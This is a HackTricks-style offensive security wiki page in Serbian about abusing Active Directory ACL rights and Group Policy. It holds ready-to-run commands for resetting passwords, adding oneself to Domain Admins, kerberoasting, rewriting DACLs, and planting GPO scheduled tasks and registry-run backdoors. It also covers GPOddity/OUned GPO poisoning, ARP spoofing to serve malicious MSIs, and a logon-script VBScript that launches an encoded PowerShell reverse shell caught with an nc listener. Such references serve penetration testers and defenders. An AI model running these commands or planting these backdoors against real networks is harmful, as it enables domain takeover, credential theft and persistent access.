# Zloupotreba Active Directory ACL-ova/ACE-ova

{{#include ../../../banners/hacktricks-training.md}}

**Ova stranica je uglavnom sažetak tehnika iz** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **i** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Za više detalja pogledajte originalne članke.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll prava nad korisnikom**

Ova privilegija napadaču daje potpunu kontrolu nad ciljanim korisničkim nalogom. Kada se `GenericAll` prava potvrde pomoću komande `Get-ObjectAcl`, napadač može da:

- **Promeni lozinku cilja**: Pomoću komande `net user <username> <password> /domain`, napadač može da resetuje korisničku lozinku.
- Sa Linuxa, isto možete uraditi preko SAMR-a koristeći Samba `net rpc`:<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **Ako je nalog onemogućen, uklonite UAC flag**: `GenericAll` omogućava izmenu `userAccountControl`. Iz Linuxa, BloodyAD može ukloniti `ACCOUNTDISABLE` flag:<sup>[[8]](#references)[[10]](#references)</sup>
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: Dodelite SPN korisničkom nalogu kako bi nad njim bilo moguće izvršiti kerberoasting, a zatim koristite Rubeus i targetedKerberoast.py za ekstrakciju i pokušaj crackovanja hash-eva ticket-granting ticket-a (TGT-a).
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Ciljani ASREPRoasting**: Onemogućite pre-authentication za korisnika, čime njegov nalog postaje ranjiv na ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: Sa `GenericAll` pravima nad korisnikom možete dodati credential zasnovan na sertifikatu i autentifikovati se kao taj korisnik bez menjanja njegove lozinke. Pogledajte:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Prava GenericAll nad grupom**

Ova privilegija omogućava napadaču da menja članstvo u grupi ako ima `GenericAll` prava nad grupom kao što je `Domain Admins`. Nakon identifikovanja distinguished name grupe pomoću `Get-NetGroup`, napadač može:

- **Dodati sebe u grupu Domain Admins**: Ovo se može uraditi pomoću direktnih komandi ili korišćenjem modula kao što su Active Directory ili PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Sa Linuxa takođe možete iskoristiti BloodyAD da dodate sebe u proizvoljne grupe kada nad njima imate GenericAll/Write dozvole. Ako je ciljna grupa ugnježdena u „Remote Management Users“, odmah ćete dobiti WinRM pristup hostovima koji koriste tu grupu:<sup>[[8]](#references)</sup>
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Posedovanje ovih privilegija nad objektom računara ili korisničkim nalogom omogućava:

- **Kerberos Resource-based Constrained Delegation**: Omogućava preuzimanje kontrole nad objektom računara.
- **Shadow Credentials**: Korišćenje ove tehnike za impersonaciju računara ili korisničkog naloga iskorišćavanjem privilegija za kreiranje shadow credentials.

## **WriteProperty on Group**

Ako korisnik ima prava `WriteProperty` nad svim objektima za određenu grupu (npr. `Domain Admins`), može da:

- **Add Themselves to the Domain Admins Group**: Ova metoda, koja se može ostvariti kombinovanjem komandi `net user` i `Add-NetGroupUser`, omogućava eskalaciju privilegija unutar domena.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

Ova privilegija omogućava napadačima da dodaju sebe u određene grupe, kao što je `Domain Admins`, pomoću komandi koje direktno manipulišu članstvom u grupi. Sledeći niz komandi omogućava dodavanje samog sebe:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Slična privilegija omogućava napadačima da se direktno dodaju u grupe izmenom svojstava grupa, ukoliko imaju pravo `WriteProperty` nad tim grupama. Provera i iskorišćavanje ove privilegije obavljaju se pomoću:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Posedovanje prava `ExtendedRight` nad korisnikom za `User-Force-Change-Password` omogućava resetovanje lozinke bez poznavanja trenutne lozinke. Provera ovog prava i njegovo iskorišćavanje mogu se obaviti putem PowerShell-a ili alternativnih command-line alata, što pruža nekoliko metoda za resetovanje lozinke korisnika, uključujući interaktivne sesije i one-liner komande za neinteraktivna okruženja. Komande se kreću od jednostavnih PowerShell poziva do korišćenja alata `rpcclient` na Linux-u, čime se demonstrira raznovrsnost attack vektora.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner on Group**

Ako napadač utvrdi da ima `WriteOwner` prava nad grupom, može da promeni vlasnika grupe u sebe. Ovo je posebno značajno kada je grupa `Domain Admins`, jer promena vlasništva omogućava širu kontrolu nad atributima i članstvom grupe. Proces obuhvata identifikovanje odgovarajućeg objekta pomoću `Get-ObjectAcl`, a zatim korišćenje `Set-DomainObjectOwner` za izmenu vlasnika, bilo putem SID-a ili imena.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite nad korisnikom**

Ova dozvola napadaču omogućava izmenu svojstava korisnika. Konkretno, uz pristup `GenericWrite`, napadač može da promeni putanju logon skripte korisnika kako bi se izvršila zlonamerna skripta prilikom prijavljivanja korisnika. To se postiže upotrebom komande `Set-ADObject` za ažuriranje svojstva `scriptpath` ciljnog korisnika tako da pokazuje na skriptu napadača.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Sa ovom privilegijom, napadači mogu da menjaju članstvo u grupama, na primer tako što sebe ili druge korisnike dodaju u određene grupe. Ovaj proces obuhvata kreiranje credential objekta, njegovo korišćenje za dodavanje ili uklanjanje korisnika iz grupe i proveru promena članstva pomoću PowerShell komandi.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Sa Linux-a, Samba `net` može da dodaje/uklanja članove kada imate `GenericWrite` nad grupom (korisno kada PowerShell/RSAT nisu dostupni):<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

Posedovanje AD objekta i privilegije `WriteDACL` nad njim omogućavaju napadaču da sebi dodeli privilegije `GenericAll` nad objektom. To se postiže putem ADSI manipulacije, što omogućava potpunu kontrolu nad objektom i mogućnost izmene njegovog članstva u grupama. Ipak, postoje ograničenja pri pokušaju iskorišćavanja ovih privilegija pomoću cmdlet-a `Set-Acl` / `Get-Acl` modula Active Directory.<sup>[[4]](#references)[[7]](#references)</sup>
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner brzo preuzimanje (PowerView)

Kada imate `WriteOwner` i `WriteDacl` nad user ili service account nalogom, možete preuzeti potpunu kontrolu i resetovati njegovu lozinku koristeći PowerView, bez poznavanja stare lozinke:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Notes:
- Možda ćete prvo morati da promenite vlasnika na sebe ako imate samo `WriteOwner`:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Validirajte pristup bilo kojim protokolom (SMB/LDAP/RDP/WinRM) nakon resetovanja lozinke.

## **Replication on the Domain (DCSync)**

DCSync attack koristi specifične dozvole za replikaciju na domenu kako bi oponašao Domain Controller i sinhronizovao podatke, uključujući korisničke kredencijale. Ova moćna tehnika zahteva dozvole kao što je `DS-Replication-Get-Changes`, koje napadačima omogućavaju izdvajanje osetljivih informacija iz AD okruženja bez direktnog pristupa Domain Controlleru.<sup>[[5]](#references)</sup> [**Learn more about the DCSync attack here.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Delegirani pristup za upravljanje Group Policy Objects (GPOs) može predstavljati značajne bezbednosne rizike. Na primer, ako korisnik kao što je `offense\spotless` ima delegirana prava za upravljanje GPO-ovima, može imati privilegije poput **WriteProperty**, **WriteDacl** i **WriteOwner**. Ove dozvole mogu biti zloupotrebljene u zlonamerne svrhe, što se može identifikovati pomoću PowerView-a: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### Enumerate GPO Permissions

Da bi se identifikovali pogrešno konfigurisani GPO-ovi, PowerSploit cmdlet-i mogu se povezati u lanac. To omogućava pronalaženje GPO-ova kojima određeni korisnik ima pravo da upravlja: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computers with a Given Policy Applied**: Moguće je utvrditi na koje se računare primenjuje određeni GPO, što pomaže u razumevanju obima potencijalnog uticaja. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Policies Applied to a Given Computer**: Da biste videli koje se politike primenjuju na određeni računar, mogu se koristiti komande kao što je `Get-DomainGPO`.

**OUs with a Given Policy Applied**: Identifikovanje organizacionih jedinica (OUs) na koje utiče određena politika može se obaviti pomoću `Get-DomainOU`.

Takođe možete koristiti alat [**GPOHound**](https://github.com/cogiceo/GPOHound) za enumeraciju GPO-ova i pronalaženje problema u njima.

### Abuse GPO - New-GPOImmediateTask

Pogrešno konfigurisani GPO-ovi mogu se iskoristiti za izvršavanje koda, na primer kreiranjem neposrednog zakazanog zadatka. Ovo se može uraditi radi dodavanja korisnika u grupu lokalnih administratora na pogođenim računarima, čime se privilegije značajno povećavaju:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

GroupPolicy module, ako je instaliran, omogućava kreiranje i povezivanje novih GPO-ova, kao i postavljanje preferenci, poput vrednosti registra, za izvršavanje backdoor-a na pogođenim računarima. Ovaj metod zahteva da GPO bude ažuriran i da se korisnik prijavi na računar kako bi se izvršio:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse nudi metod za zloupotrebu postojećih GPO-ova dodavanjem zadataka ili izmenom podešavanja bez potrebe za kreiranjem novih GPO-ova. Ovaj alat zahteva izmenu postojećih GPO-ova ili korišćenje RSAT alata za kreiranje novih pre primene izmena:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Prinudno ažuriranje Policy-ja

GPO ažuriranja se obično izvršavaju otprilike svakih 90 minuta. Da bi se ovaj proces ubrzao, naročito nakon primene izmene, na ciljnom računaru može se koristiti komanda `gpupdate /force` za prinudno trenutno ažuriranje policy-ja. Ova komanda obezbeđuje da se sve izmene GPO-ova primene bez čekanja na sledeći automatski ciklus ažuriranja.

### Ispod haube

Pregledom Scheduled Tasks za određeni GPO, kao što je `Misconfigured Policy`, može se potvrditi dodavanje zadataka kao što je `evilTask`. Ovi zadaci se kreiraju pomoću skripti ili command-line alata sa ciljem izmene ponašanja sistema ili eskalacije privilegija.

Struktura zadatka, prikazana u XML configuration fajlu koji generiše `New-GPOImmediateTask`, definiše detalje Scheduled Task-a - uključujući komandu koja će biti izvršena i njene okidače. Ovaj fajl prikazuje način na koji se Scheduled Tasks definišu i upravljaju unutar GPO-ova, pružajući metod za izvršavanje proizvoljnih komandi ili skripti u okviru primene policy-ja.

### Korisnici i grupe

GPO-ovi takođe omogućavaju izmenu članstva korisnika i grupa na ciljnim sistemima. Direktnim uređivanjem policy fajlova za Users and Groups, napadači mogu dodati korisnike u privilegovane grupe, kao što je lokalna `administrators` grupa. Ovo je moguće putem delegiranja dozvola za upravljanje GPO-ovima, koje omogućava izmenu policy fajlova radi dodavanja novih korisnika ili promene članstva u grupama.

XML configuration fajl za Users and Groups definiše način na koji se ove izmene primenjuju. Dodavanjem unosa u ovaj fajl, određenim korisnicima mogu se dodeliti povišene privilegije na svim pogođenim sistemima. Ovaj metod pruža direktan pristup eskalaciji privilegija kroz manipulaciju GPO-ovima.

Pored toga, mogu se razmotriti i dodatni metodi za izvršavanje koda ili održavanje persistence-a, kao što su korišćenje logon/logoff skripti, izmena registry ključeva za autoruns, instaliranje softvera putem .msi fajlova ili uređivanje service konfiguracija. Ove tehnike pružaju različite načine za održavanje pristupa i kontrolu ciljnih sistema zloupotrebom GPO-ova.

### Preusmeravanje GPC/GPT preuzimanja ka autentifikovanim rogue servisima

GPO se sastoji od LDAP **Group Policy Container (GPC)** sa metadata podacima i preko SMB-a hostovanog **Group Policy Template (GPT)** sa policy fajlovima. Tokom osvežavanja, client prati `gPLink` kontejnera, čita referencirani GPC i njegov `gPCFileSysPath`, a zatim preuzima GPT sa te UNC putanje. Zbog toga se write access nad samim GPC-om ili nad `gPLink` vrednošću OU-a, Site-a ili Domain-a može pretvoriti u privilegovanu obradu policy-ja.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### `gPCFileSysPath` poisoning sa GPOddity

Ako controlled principal može da upisuje u ciljni GPC (direktno ili putem **NTLM relay to LDAP**), potrebno je zameniti `gPCFileSysPath` UNC putanjom koju hostuje napadač. [GPOddity](https://github.com/synacktiv/GPOddity) automatizuje LDAP izmenu i hostuje malicious GPT koji sadrži module-based policy fajlove ili Immediate Task koji Group Policy client izvršava kao `NT AUTHORITY\SYSTEM`.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

Anonimni SMB share ili SMB share koji ne zahteva credentials nije dovoljan na aktuelnim Windows clientima: SMB Secure Negotiate zahteva dokaz da je authentication uspeo, pa rogue service mora da validira identitet domena, izvede SMB session key i pravilno potpisuje svoje odgovore. U embedded mode-u, konfigurišite GPOddity sa controlled machine account-om i njegovim service key-em, a zatim izaberite computer- ili user-side payload u sekciji `[COMMANDS]`.<sup>[[15]](#references)[[16]](#references)</sup>
```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```
**Granični slučaj korisničkog GPO-a:** nakon MS16-072, Windows i dalje kreira dve SMB2 sesije u okviru **iste TCP veze**: korisnička sesija čita `GPT.INI`, zatim sesija computer account-a čita efektivnu konfiguraciju, kao što je `ScheduledTasks.xml`. Rogue server zato mora da indeksira stanje autentikacije, ključeve sesije i ključeve za potpisivanje prema SMB2 `SessionId`, a ne samo prema socket-u. Scapy fork ugrađen u GPOddity/OUned ovo implementira kroz `SMBStreamSocketMultiplexing` i multiplexing-aware `SMBServer`; single-session Impacket/Scapy serveri inače ponovo koriste pogrešno stanje za potpisivanje i ne uspevaju kod korisničkih policy-ja.<sup>[[15]](#references)</sup>

#### `gPLink poisoning` sa OUned

Uz `WriteGPLink`, `GenericWrite` ili ekvivalentnu kontrolu nad OU, Site ili Domain objektom, attacker može da doda link čiji GPC DN poslužuje LDAP host pod kontrolom attackera. Ovaj primitive je prvobitno predstavio Petros Koutroumpis; [OUned](https://github.com/synacktiv/OUned) automatizuje LDAP upis i zlonamerni GPC/GPT chain.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>
```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```
Žrtva se najpre autentifikuje na rogue LDAP service i prima GPC čiji `gPCFileSysPath` pokazuje na rogue SMB service; zatim se autentifikuje na SMB i primenjuje dostavljeni GPT. OUned stoga zahteva nalog sa LDAP SPN-om, machine account sa HOST SPN-om za SMB (isti machine account može zadovoljiti oba uslova) i DNS resolution ili reverse forwarding koji prosleđuje portove 389 i 445 na host operatera.<sup>[[15]](#references)[[17]](#references)</sup>
```bash
python3 OUned.py --config config.ini -v
```
OUned-ov ugrađeni Scapy LDAP server validira Kerberos/SPNEGO pomoću stvarnog ključa kontrolisanog service-a i servira proizvoljne GPC podatke iz JSON-a. Prazni JSON ključ predstavlja rootDSE, prefiksi `base64:` predstavljaju binarne vrednosti, a server podržava add/delete/modify/search, kao i `BASE`, `LEVEL` i `SUBTREE` pretrage; može da pregovara o zaštiti bez zaštite, integritetu ili poverljivosti. Ovo čini service ponovo upotrebljivim kada druga Windows komponenta prati LDAP referencu pod kontrolom napadača, ali zahteva autentifikovani LDAP.<sup>[[15]](#references)</sup>

Ne pretpostavljajte da sinhronizacija lozinke account-a u dummy domain reprodukuje svaki Kerberos ključ: RC4 se izvodi iz lozinke, dok AES string-to-key takođe koristi salt izveden iz hostname-a/domain-a principal-a. Prosleđivanje stvarnog AES ključa account-a u `KerberosSSP` izbegava forsiranje RC4 kroz detektabilnu izmenu `msDS-SupportedEncryptionTypes` atributa machine account-a, koji može sam da upisuje.<sup>[[15]](#references)</sup>

#### Tačke za detekciju

Korelirajte izmene `gPCFileSysPath` ili `gPLink` sa izmenama GPO verzija i novim Immediate/Scheduled Task XML-om. Istražite linkove ka neočekivanim naming context-ima, UNC hostovima izvan odobrenog DC/SYSVOL skupa, DNS zapise koji preusmeravaju imena machine account-a, LDAP/CIFS service tickets za neuobičajene machine account-e i izmene `msDS-SupportedEncryptionTypes` koje omogućavaju RC4.<sup>[[15]](#references)</sup>

### WriteGPLink + UNC path hijacking (ARP spoofing)

`WriteGPLink` nad OU/domain-om omogućava izmenu `gPLink` atributa ciljnog container-a i **forsiranje primene postojećeg GPO-a** bez izmene samog GPO-a. Ovo postaje zanimljivo kada povezani GPO već referencira udaljeni sadržaj preko **UNC path-ova** (`\\HOST\share\...`), jer autentifikovani korisnici mogu da čitaju **SYSVOL** i offline traže politike koje se mogu ponovo upotrebiti.<sup>[[11]](#references)</sup>

Workflow na visokom nivou:

1. Koristite BloodHound da identifikujete principal sa `WriteGPLink` nad OU-om i izlistate computer-e/user-e unutar tog OU-a.
2. Klonirajte `SYSVOL` samo za čitanje i parsirajte GPO-ove tražeći **Software Installation**, **drive mappings** (`Drives.xml`) i **logon/startup scripts** koji referenciraju UNC path-ove.
3. Dajte prednost politikama koje upućuju na **direktan hostname** (na primer `\\DC02\share\pkg.msi`) umesto DFS/domain-namespace path-ova, jer se path-ovi zasnovani na hostname-u lakše preusmeravaju pomoću L2 spoofing-a.
4. Dodajte GUID izabranog GPO-a u `gPLink` ciljnog OU-a kako bi victim obradio tu već postojeću politiku.
5. Na istom broadcast domain-u izvršite ARP spoofing UNC host-a i lokalno povežite njegov IP (`ip addr add <target_ip>/32 dev <iface>`) kako bi SMB saobraćaj victim-a stigao do vašeg host-a.
6. Servirajte očekivani path/filename sa attacker SMB server-a (na primer `smbserver.py`) i sačekajte normalnu obradu politike.

Primer prikupljanja `SYSVOL`-a i korelacije GPO-ova:
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
Povežite postojeći GPO sa ciljnom OU:
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Software Installation UNC hijack -> SYSTEM

Ako povezani GPO deploy-uje MSI sa UNC putanje, klijent će ga preuzeti tokom **pokretanja računara** i instalirati kao **`NT AUTHORITY\SYSTEM`**. Lažiranjem navedenog hosta i posluživanjem malicioznog MSI-ja pod **istim share/path/name**, možete pretvoriti `WriteGPLink` u izvršavanje koda sa SYSTEM privilegijama **bez menjanja SYSVOL-a**.

Važna ograničenja:

- **Tajming je važan**: nova veza se uočava pri osvežavanju policy-ja (obično ~90 minuta), ali se **Software Installation** obično pokreće pri **restartu**.
- Windows Installer obično prati deployment pomoću **`ProductCode`** vrednosti. Ako je proizvod već instaliran, deployment može biti preskočen.
- Da biste izbegli odbijanje od strane installer-a, izmenite rogue MSI tako da njegov **`ProductCode`** i **`PackageCode`** odgovaraju vrednostima legitimnog paketa koji GPO očekuje.
- Stari `.aas` advertisement fajlovi mogu ostati u `SYSVOL`-u, zato proverite da li deployment i dalje izgleda aktivno pre nego što se oslonite na njega.
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

GPP drive mappings in `Drives.xml` uzrokuju da se korisnici autentifikuju na konfigurisanoj UNC putanji tokom prijavljivanja ili ponovnog povezivanja. Ako lažirate referencirani host, možete uhvatiti **NetNTLMv2**. Ako se SMB namerno onemogući, Windows može ponovo pokušati preko **WebDAV-a**, šaljući **NTLM preko HTTP-a**, što je mnogo fleksibilnije za relaying ka **LDAP(S)**, **AD CS** ili **SMB**.

#### Logon/startup script UNC hijack

Isti obrazac važi za skripte hostovane na UNC putanjama otkrivene u `SYSVOL`:

- **Logon scripts** se obično izvršavaju u kontekstu **user** naloga.
- **Startup scripts** se obično izvršavaju u kontekstu **computer / SYSTEM** naloga.

Ako putanja skripte pokazuje na hostname koji se može lažirati, preusmerite UNC host i poslužite zamenski sadržaj skripte sa očekivane lokacije.

## SYSVOL/NETLOGON Logon Script Poisoning

Putanje sa dozvolom upisivanja unutar `\\<dc>\SYSVOL\<domain>\scripts\` ili `\\<dc>\NETLOGON\` omogućavaju izmenu logon skripti koje se izvršavaju pri prijavljivanju korisnika putem GPO-a. Ovo omogućava izvršavanje koda u bezbednosnom kontekstu korisnika koji se prijavljuju.

### Locate logon scripts
- Pregledajte atribute korisnika da biste pronašli konfigurisanu logon skriptu:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Pretražite deljene resurse domena da biste pronašli prečice ili reference ka skriptama:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- Analizirajte `.lnk` datoteke da biste razrešili ciljeve koji upućuju na SYSVOL/NETLOGON (koristan DFIR trik i za napadače bez direktnog pristupa GPO-u):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound prikazuje atribut `logonScript` (scriptPath) na čvorovima korisnika kada je prisutan.

### Proverite pristup za upis (ne verujte listama deljenih resursa)
Automatizovani alati mogu prikazati SYSVOL/NETLOGON kao resurse samo za čitanje, ali osnovne NTFS ACL dozvole i dalje mogu omogućiti upis. Uvek testirajte:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
Ako se veličina fajla ili mtime promene, imate write pristup. Sačuvajte originale pre izmena.

### Poison a VBScript logon script for RCE
Dodajte komandu koja pokreće PowerShell reverse shell (generišite ga na revshells.com) i zadržite originalnu logiku da ne biste prekinuli poslovnu funkcionalnost:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Osluškujte na svom hostu i sačekajte sledeću interaktivnu prijavu:
```bash
rlwrap -cAr nc -lnvp 443
```
Napomena:
- Izvršavanje se odvija pod tokenom korisnika koji se prijavljuje (ne SYSTEM). Opseg predstavlja GPO link (OU, site, domain) na koji se ta skripta primenjuje.
- Nakon upotrebe izvršite čišćenje vraćanjem originalnog sadržaja/vremenskih oznaka.


## References

- [1] [Zloupotreba Active Directory ACL-ova/ACE-ova](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Privilegovani nalozi i privilegije tokena](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – Ažuriranje putanje napada putem ACL-ova](https://wald0.com/?p=112)
- [4] [ActiveDirectoryRights Enum - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Eskalacija privilegija pomoću ACL-ova u Active Directory-ju](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Skeniranje privilegija i privilegovanih naloga u Active Directory-ju](https://adsecurity.org/?p=3658)
- [7] [ActiveDirectoryAccessRule Constructor - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – AD operacije nad atributima/UAC-om iz Linux-a](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (članstvo u grupi)](https://www.samba.org/)
- [10] [HTB Puppy: zloupotreba AD ACL-ova, razbijanje KeePassXC Argon2 i DPAPI dešifrovanje do administratorskog naloga DC-ja](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: preuzimanje GPO UNC putanja za izvršavanje koda i NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity: iskorišćavanje Active Directory GPO-ova putem NTLM relaying-a i još mnogo toga](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [OU having a laugh? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
